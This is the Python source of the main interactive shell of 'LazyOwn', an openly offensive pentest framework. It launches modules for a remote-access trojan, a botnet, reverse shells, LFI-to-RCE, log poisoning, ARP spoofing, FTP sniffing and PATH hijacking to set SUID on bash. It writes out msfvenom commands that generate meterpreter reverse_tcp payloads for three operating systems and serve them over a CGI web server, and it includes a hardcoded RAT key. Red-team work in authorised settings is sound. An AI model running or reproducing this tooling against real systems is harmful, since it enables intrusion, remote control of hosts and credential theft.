#!/usr/bin/env python3
# _*_ coding: utf8 _*_
"""
main.py

Autor: Gris Iscomeback
Correo electrónico: grisiscomeback[at]gmail[dot]com
Fecha de creación: 09/06/2024
Licencia: GPL v3

Descripción: Este archivo contiene la definición de las rutas y la lógica de la aplicación de Terminal.
LazyOwn Framework SHELL

██╗      █████╗ ███████╗██╗   ██╗ ██████╗ ██╗    ██╗███╗   ██╗
██║     ██╔══██╗╚══███╔╝╚██╗ ██╔╝██╔═══██╗██║    ██║████╗  ██║
██║     ███████║  ███╔╝  ╚████╔╝ ██║   ██║██║ █╗ ██║██╔██╗ ██║
██║     ██╔══██║ ███╔╝    ╚██╔╝  ██║   ██║██║███╗██║██║╚██╗██║
███████╗██║  ██║███████╗   ██║   ╚██████╔╝╚███╔███╔╝██║ ╚████║
╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝    ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝

"""

import os
import sys
import subprocess
import shlex
import signal
import json
from cmd import Cmd

BANNER = """
 ██▓    ▄▄▄      ▒███████▒▓██   ██▓ ▒█████   █     █░███▄    █                
▓██▒   ▒████▄    ▒ ▒ ▒ ▄▀░ ▒██  ██▒▒██▒  ██▒▓█░ █ ░█░██ ▀█   █                
▒██░   ▒██  ▀█▄  ░ ▒ ▄▀▒░   ▒██ ██░▒██░  ██▒▒█░ █ ░█▓██  ▀█ ██▒               
▒██░   ░██▄▄▄▄██   ▄▀▒   ░  ░ ▐██▓░▒██   ██░░█░ █ ░█▓██▒  ▐▌██▒               
░██████▒▓█   ▓██▒▒███████▒  ░ ██▒▓░░ ████▓▒░░░██▒██▓▒██░   ▓██░               
░ ▒░▓  ░▒▒   ▓▒█░░▒▒ ▓░▒░▒   ██▒▒▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒ ░ ▒░   ▒ ▒                
░ ░ ▒  ░ ▒   ▒▒ ░░░▒ ▒ ░ ▒ ▓██ ░▒░   ░ ▒ ▒░   ▒ ░ ░ ░ ░░   ░ ▒░               
  ░ ░    ░   ▒   ░ ░ ░ ░ ░ ▒ ▒ ░░  ░ ░ ░ ▒    ░   ░    ░   ░ ░                
    ░  ░     ░  ░  ░ ░     ░ ░         ░ ░      ░            ░                
                 ░         ░ ░                                                
  █████▒██▀███   ▄▄▄       ███▄ ▄███▓▓█████  █     █░ ▒█████   ██▀███   ██ ▄█▀
▓██   ▒▓██ ▒ ██▒▒████▄    ▓██▒▀█▀ ██▒▓█   ▀ ▓█░ █ ░█░▒██▒  ██▒▓██ ▒ ██▒ ██▄█▒ 
▒████ ░▓██ ░▄█ ▒▒██  ▀█▄  ▓██    ▓██░▒███   ▒█░ █ ░█ ▒██░  ██▒▓██ ░▄█ ▒▓███▄░ 
░▓█▒  ░▒██▀▀█▄  ░██▄▄▄▄██ ▒██    ▒██ ▒▓█  ▄ ░█░ █ ░█ ▒██   ██░▒██▀▀█▄  ▓██ █▄ 
░▒█░   ░██▓ ▒██▒ ▓█   ▓██▒▒██▒   ░██▒░▒████▒░░██▒██▓ ░ ████▓▒░░██▓ ▒██▒▒██▒ █▄
 ▒ ░   ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ▒░   ░  ░░░ ▒░ ░░ ▓░▒ ▒  ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░▒ ▒▒ ▓▒
 ░       ░▒ ░ ▒░  ▒   ▒▒ ░░  ░      ░ ░ ░  ░  ▒ ░ ░    ░ ▒ ▒░   ░▒ ░ ▒░░ ░▒ ▒░
 ░ ░     ░░   ░   ░   ▒   ░      ░      ░     ░   ░  ░ ░ ░ ▒    ░░   ░ ░ ░░ ░ 
          ░           ░  ░       ░      ░  ░    ░        ░ ░     ░     ░  ░   
                                                                              
[*] Iniciando: Framework [;,;]
"""
print(BANNER)


def signal_handler(sig, frame):
    global should_exit
    print("\n [<-] para salir usar el comando exit ...")
    should_exit = True


signal.signal(signal.SIGINT, signal_handler)


class LazyOwnShell(Cmd):
    prompt = "LazyOwn> "
    intro = """Welcome to the LazyOwn Framework [;,;] interactive shell! Type ? to list commands
Github: https://github.com/grisuno/LazyOwn
Web: https://grisuno.github.io/LazyOwn/
Reddit: https://www.reddit.com/r/LazyOwn/
Facebook: https://web.facebook.com/profile.php?id=61560596232150
    """

    def __init__(self):
        super().__init__()
        self.params = {
            "binary_name": "gzip",
            "target_ip": "127.0.0.1",
            "api_key": None,
            "prompt": None,
            "url": None,
            "method": "GET",
            "headers": "{}",
            "params": "{}",
            "data": "{}",
            "json_data": "{}",
            "proxy_port": 8080,
            "wordlist": None,
            "hide_code": None,
            "mode": None,
            "attacker_ip": None,
            "reverse_shell_ip": None,
            "reverse_shell_port": None,
            "path": "/",
            "rhost": None,
            "lhost": None,
            "rport": 1337,
            "lport": 1337,
            "rat_key": "82e672ae054aa4de6f042c888111686a",
            "startip": "192.168.1.1",
            "endip": "192.168.1.254",
            "spoof_ip": "185.199.110.153",
            "device": "eth0",
            "email_from": "email@gmail.com",
            "email_to": "email@gmail.com",
            "email_username": "email@gmail.com",
            "email_password": "pa$$w0rd",
            "smtp_server": "smtp.server.com",
            "smtp_port": "587",
            "field": "page",
            "headers_file": None,
            "data_file": None,
            "params_file": None,
            "json_data_file": None, 
        }
        self.scripts = [
            "lazysearch",
            "lazysearch_gui",
            "lazyown",
            "update_db",
            "lazynmap",
            "lazynmapdiscovery",
            "lazygptcli",
            "lazyburpfuzzer",
            "lazymetaextract0r",
            "lazyreverse_shell",
            "lazyattack",
            "lazyownratcli",
            "lazyownrat",
            "lazygath",
            "lazysniff",
            "lazynetbios",
            "lazybotnet",
            "lazybotcli",
            "lazyhoneypot",
            "lazysearch_bot",
            "lazylfi2rce",
            "lazylogpoisoning",
            "lazymsfvenom",
            "lazypathhijacking",
            "lazyarpspoofing",
            "lazyftpsniff",
        ]
        self.output = ""

    def one_cmd(self, command):
        self.output = self.get_output
        try:
            self.onecmd(command)  # Ejecuta el comando directamente
            self.output = "Command executed successfully."
            return self.output
        except Exception as e:
            self.output = str(e)

    def do_set(self, line):
        """Set a parameter value. Usage: set <parameter> <value>"""
        args = shlex.split(line)
        if len(args) != 2:
            print("[?] Usage: set <parameter> <value>")
            return

        param, value = args
        if param in self.params:
            self.params[param] = value
            print(f"[SET] {param} set to {value}")
        else:
            print(f"[?] Unknown parameter: {param}")

    def do_show(self, line):
        """Show the current parameter values"""
        for param, value in self.params.items():
            print(f"{param}: {value}")

    def do_list(self, line):
        """List all available scripts"""
        print("Available scripts to run:")
        for script in self.scripts:
            print(f"- {script}")

    def do_run(self, line):
        """Run a specific LazyOwn script"""
        args = shlex.split(line)
        if not args:
            print("[?] Usage: run <script_name>")
            return

        script_name = args[0]
        if script_name in self.scripts:
            getattr(self, f"run_{script_name}")()
        else:
            print(f"Unknown script: {script_name}")

    def run_lazysearch(self):
        binary_name = self.params["binary_name"]
        if not binary_name:
            print("[?] binary_name not set")
            return
        self.run_script("modules/lazysearch.py", binary_name)

    def run_lazysearch_gui(self):
        self.run_script("modules/LazyOwnExplorer.py")

    def run_lazyown(self):
        self.run_script("modules/lazyown.py")

    def run_update_db(self):
        os.system("./modules/update_db.sh")

    def run_lazynmap(self):
        path = os.getcwd()
        target_ip = self.params["target_ip"]
        os.system(f"{path}/modules/lazynmap.sh -t {target_ip}")

    def run_lazygath(self):
        path = os.getcwd()
        os.system(f"sudo {path}/modules/lazygat.sh")

    def run_lazynmapdiscovery(self):
        path = os.getcwd()
        os.system(f"{path}/modules/lazynmap.sh -d")

    def run_lazysniff(self):
        env = os.environ.copy()
        env["LANG"] = "en_US.UTF-8"
        env["TERM"] = "xterm-256color"
        device = self.params["device"]
        subprocess.run(
            ["python3", "modules/lazysniff.py", "-i", device],
            env=env,
            stdin=sys.stdin,
            stdout=sys.stdout,
            stderr=sys.stderr,
        )

    def run_lazyftpsniff(self):
        device = self.params["device"]
        env = os.environ.copy()
        env["LANG"] = "en_US.UTF-8"
        env["TERM"] = "xterm-256color"
        if not device:
            print("device must be set to choice the interface")
            return
        subprocess.run(["python3", "modules/lazyftpsniff.py", "-i", device])

    def run_lazynetbios(self):
        startip = self.params["startip"]
        endip = self.params["endip"]
        spoof_ip = self.params["spoof_ip"]
        subprocess.run(["python3", "modules/lazynetbios.py", startip, endip, spoof_ip])

    def run_lazyhoneypot(self):
        email_from = self.params["email_from"]
        email_to = self.params["email_to"]
        email_username = self.params["email_username"]
        email_password = self.params["email_password"]
        self.run_script(
            "modules/lazyhoneypot.py",
            "--email_from",
            email_from,
            "--email_to",
            email_to,
            "--email_username",
            email_username,
            "--email_password",
            email_password,
        )

    def run_lazygptcli(self):
        prompt = self.params["prompt"]
        api_key = self.params["api_key"]
        if not prompt or not api_key:
            print("[?] prompt and api_key must be set")
            return
        os.environ["GROQ_API_KEY"] = api_key
        self.run_script("modules/lazygptcli.py", "--prompt", prompt)

    def run_lazysearch_bot(self):
        prompt = self.params["prompt"]
        api_key = self.params["api_key"]
        if not prompt or not api_key:
            print("[?] prompt and api_key must be set")
            return
        os.environ["GROQ_API_KEY"] = api_key
        self.run_script("modules/lazysearch_bot.py", "--prompt", prompt)

    def run_lazymetaextract0r(self):
        path = self.params["path"]
        if not path:
            print("[?] path must be set")
            return
        self.run_script("modules/lazyown_metaextract0r.py", "--path", path)

    def run_lazyownratcli(self):
        lhost = self.params["lhost"]
        lport = self.params["lport"]
        rat_key = self.params["rat_key"]
        if not lhost or not lport or not rat_key:
            print("[?] lhost and lport and rat_key must be set")
            return
        self.run_script(
            "modules/lazyownclient.py",
            "--host",
            lhost,
            "--port",
            str(lport),
            "--key",
            rat_key,
        )

    def run_lazyownrat(self):
        rhost = self.params["rhost"]
        rport = self.params["rport"]
        rat_key = self.params["rat_key"]
        if not rhost or not rport or not rat_key:
            print("[?] rhost and lport and rat_key must be set")
            return
        self.run_script(
            "modules/lazyownserver.py",
            "--host",
            rhost,
            "--port",
            str(rport),
            "--key",
            rat_key,
        )

    def run_lazybotnet(self):
        rhost = "0.0.0.0"
        rport = self.params["rport"]
        rat_key = self.params["rat_key"]
        if not rhost or not rport or not rat_key:
            print("[?] rhost and lport and rat_key must be set")
            return
        self.run_script(
            "modules/lazybotnet.py",
            "--host",
            rhost,
            "--port",
            str(rport),
            "--key",
            rat_key,
        )

    def run_lazylfi2rce(self):
        rhost = self.params["rhost"]
        rport = self.params["rport"]
        lhost = self.params["lhost"]
        lport = self.params["lport"]
        field = self.params["field"]
        wordlist = self.params["wordlist"]

        if (
            not rhost
            or not rport
            or not lhost
            or not lport
            or not field
            or not wordlist
        ):
            print("[?] rhost and rport field and lhost lport wordlist must be set")
            return
        self.run_script(
            "modules/lazylfi2rce.py",
            "--rhost",
            rhost,
            "--rport",
            str(rport),
            "--lhost",
            lhost,
            "--lport",
            str(lport),
            "--field",
            field,
            "--wordlist",
            wordlist,
        )

    def run_lazylogpoisoning(self):
        rhost = self.params["rhost"]
        lhost = self.params["lhost"]

        if not rhost or not lhost:
            print("[?] rhost and lhost must be set")
            return
        self.run_script(
            "modules/lazylogpoisoning.py", "--rhost", rhost, "--lhost", lhost
        )

    def run_lazybotcli(self):
        rhost = "0.0.0.0"
        rport = self.params["rport"]
        rat_key = self.params["rat_key"]
        if not rhost or not rport or not rat_key:
            print("[?] rhost and lport and rat_key must be set")
            return
        self.run_script(
            "modules/lazybotcli.py",
            "--host",
            rhost,
            "--port",
            str(rport),
            "--key",
            rat_key,
        )

    def run_lazyburpfuzzer(self):
        url = self.params["url"]
        method = self.params["method"]
        headers = self.params["headers"]
        params = self.params["params"]
        data = self.params["data"]
        json_data = self.params["json_data"]
        proxy_port = self.params["proxy_port"]
        wordlist = self.params["wordlist"]
        hide_code = self.params["hide_code"]
        headers_file = self.params.get("headers_file")
        data_file = self.params.get("data_file")
        params_file = self.params.get("params_file")
        json_data_file = self.params.get("json_data_file")

        command = [
            "python3",
            "modules/lazyown_bprfuzzer.py",
            "--url",
            url,
            "--method",
            method,
            "--proxy_port",
            str(proxy_port),
        ]

        if headers_file:
            command.extend(["--headers_file", headers_file])
        else:
            command.extend(["--headers", headers])

        if data_file:
            command.extend(["--data_file", data_file])
        else:
            command.extend(["--data", data])

        if params_file:
            command.extend(["--params_file", params_file])
        else:
            command.extend(["--params", params])

        if json_data_file:
            command.extend(["--json_data_file", json_data_file])
        else:
            command.extend(["--json_data", json_data])

        if wordlist:
            command.extend(["-w", wordlist])
        if hide_code:
            command.extend(["-hc", str(hide_code)])

        self.run_command(command)

    def run_lazyreverse_shell(self):
        ip = self.params["reverse_shell_ip"]
        port = self.params["reverse_shell_port"]
        path = os.getcwd()
        if not ip or not port:
            print("[?] reverse_shell_ip and reverse_shell_port must be set")
            return
        os.system(f"{path}/modules/lazyreverse_shell.sh --ip {ip} --puerto {port}")

    def run_lazyarpspoofing(self):
        lhost = self.params["lhost"]
        rhost = self.params["rhost"]
        device = self.params["device"]
        if not lhost or not rhost or not device:
            print("[?] lhost, lhost, and device must be set")
            return
        os.system(f"modules/lazyarpspoofing.py --device {device} {lhost} {rhost}")

    def run_lazyattack(self):
        path = os.getcwd()
        mode = self.params["mode"]
        target_ip = self.params["target_ip"]
        attacker_ip = self.params["attacker_ip"]
        if not mode or not target_ip or not attacker_ip:
            print("[?] mode, target_ip, and attacker_ip must be set")
            return
        os.system(
            f"{path}/modules/lazyatack.sh --modo {mode} --ip {target_ip} --atacante {attacker_ip}"
        )

    def run_lazymsfvenom(self):
        lhost = self.params["lhost"]
        lport = self.params["lport"]
        path = os.getcwd()
        if not lhost or not lport:
            print("[?] lport and lhost mus be set")
            return
        os.system(
            f'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f elf > shell.elf'
        )
        os.system(
            f'msfvenom -p windows/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f exe > shell.exe'
        )
        os.system(
            f'msfvenom -p osx/x86/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -f macho > shell.macho'
        )
        os.system("mv shell.* modules/cgi-bin")
        os.system("chmod +x modules/cgi-bin/*")
        print("[*] Lazy MSFVenom Reverse_shell payloads in modules/cgi-bin/ ")
        print("[?] To run web server exec command: lazywebshell [;,;] ")

    def run_lazypathhijacking(self):
        binary_name = self.params["binary_name"]
        if not binary_name:
            print("[?] binary_name must be set")
            return
        os.system(f"echo {binary_name} >> modules/tmp.sh")
        os.system(f"cp modules/tmp.sh /tmp/{binary_name}")
        os.system(f"chmod +x /tmp/{binary_name}")
        os.system("export PATH=/tmp:$PATH")
        print(
            f"[*] Lazy path hijacking with binary_name: {binary_name} to set u+s to /bin/bash"
        )

    def run_script(self, script_name, *args):
        """Run a script with the given arguments"""
        command = ["python3", script_name] + [str(arg) for arg in args]
        self.run_command(command)

    def run_command(self, command):
        """Run a command and print output in real-time"""
        process = subprocess.Popen(
            command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )
        try:
            for line in iter(process.stdout.readline, ""):
                self.output += line  # Agregar la salida a la variable self.output
                print(line, end="")
            for line in iter(process.stderr.readline, ""):
                self.output += line  # Agregar la salida de stderr también
                print(line, end="")
            process.stdout.close()
            process.stderr.close()
            process.wait()
        except KeyboardInterrupt:
            process.terminate()
            process.wait()
            print("\n[Interrupted] Process terminated")

    def do_payload(self, line):
        """Load parameters from payload.json"""
        try:
            with open("payload.json", "r") as f:
                data = json.load(f)
            for key, value in data.items():
                if key in self.params:
                    self.params[key] = value
            print("[*] Parameters loaded from payload.json")
        except FileNotFoundError:
            print("[?] payload.json not found")
        except json.JSONDecodeError:
            print("[?] Error decoding payload.json")

    def do_exit(self, line):
        """Exit the LazyOwn shell"""
        return True

    def do_fixperm(self, line):
        """Fix Perm LazyOwn shell"""
        print("[f] Fix script perm")
        os.system("chmod +x modules/*.sh")
        os.system("chmod +x modules/cgi-bin/*")

    def do_lazywebshell(self, line):
        """LazyOwn shell"""
        print("[r] Running Server in localhost:8080/cgi-bin/lazywebshell.py")
        os.system("cd modules && python3 -m http.server 8080 --cgi &")

    def do_getcap(self, line):
        """try get capabilities :)"""
        print("[+] Try get capabilities")
        os.system("getcap -r / 2>/dev/null")

    def do_lazypwn(self, line):
        """LazyPwn"""
        os.system("python3 modules/lazypwn.py")

    def do_fixel(self, line):
        """LazyLfi2Rce"""
        os.system("dos2unix *")
        os.system("dos2unix modules/*")
        os.system("dos2unix modules/cgi-bin/*")

    def do_smbserver(self, line):
        """Lazy imacket smbserver"""
        print("[*] trying sudo impacket-smbserver smbfolder $(pwd) -smb2support ...")
        os.system("sudo impacket-smbserver smbfolder $(pwd) -smb2support")

    def do_encrypt(self, line):
        """Encrypt a file using XOR. Usage: encrypt <file_path> <key>"""
        args = shlex.split(line)
        if len(args) != 2:
            print("[?] Usage: encrypt <file_path> <key>")
            return

        file_path, key = args

        try:
            with open(file_path, "rb") as f:
                data = f.read()

            encrypted_data = xor_encrypt_decrypt(data, key)
            with open(file_path + ".enc", "wb") as f:
                f.write(encrypted_data)
            print(f"[+] File encrypted: {file_path}.enc")
        except FileNotFoundError:
            print(f"[?] File not found: {file_path}")

    def do_decrypt(self, line):
        """Decrypt a file using XOR. Usage: decrypt <file_path> <key>"""
        args = shlex.split(line)
        if len(args) != 2:
            print("[?] Usage: decrypt <file_path> <key>")
            return

        file_path, key = args

        try:
            with open(file_path, "rb") as f:
                data = f.read()

            decrypted_data = xor_encrypt_decrypt(data, key)
            with open(file_path.replace(".enc", ""), "wb") as f:
                f.write(decrypted_data)
            print(f"[+] File decrypted: {file_path.replace('.enc', '')}")
        except FileNotFoundError:
            print(f"[?] File not found: {file_path}")

    def get_output(self):
        """Devuelve la salida acumulada"""
        return self.output


def xor_encrypt_decrypt(data, key):
    """XOR Encrypt or Decrypt data with a given key"""
    key_bytes = bytes(key, "utf-8")
    key_length = len(key_bytes)
    return bytearray([data[i] ^ key_bytes[i % key_length] for i in range(len(data))])


if __name__ == "__main__":
    LazyOwnShell().cmdloop()
